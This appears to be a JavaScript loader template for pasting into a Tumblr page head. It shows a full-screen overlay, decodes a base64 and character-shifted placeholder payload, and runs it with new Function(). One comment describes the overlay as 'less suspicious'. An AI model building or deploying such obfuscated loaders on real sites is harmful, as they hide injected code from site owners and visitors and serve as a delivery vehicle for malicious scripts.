/**
 * LOADER SCRIPT (To be pasted in Tumblr <head>)
 * This script handles decryption and execution of the core logic.
 */
(function() {
    // 1. GENTLE BLOCKER: Less suspicious than hiding the whole HTML tag
    const blockerId = 'tm-ly-blocker';
    if (!document.getElementById(blockerId)) {
        const div = document.createElement('div');
        div.id = blockerId;
        div.setAttribute('style', 'position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999;display:flex;align-items:center;justify-content:center;font-family:sans-serif;color:#333;');
        div.innerHTML = 'Loading...';
        document.documentElement.appendChild(div);
    }

    // The obfuscated payload and shift key will be injected here
    const __P__ = "__OBFUSCATED_PAYLOAD_PLACEHOLDER__";
    const __S__ = 5; // Placeholder shift

    function run() {
        try {
            // De-obfuscate
            const decoded = decodeURIComponent(escape(atob(__P__)));
            let code = "";
            for (let i = 0; i < decoded.length; i++) {
                code += String.fromCharCode(decoded.charCodeAt(i) - __S__);
            }
            
            if (code) {
                (new Function(code))();
            } else {
                throw 1;
            }
        } catch (e) {
            const b = document.getElementById(blockerId);
            if (b) b.remove();
        }
    }

    // Execute
    run();
})();

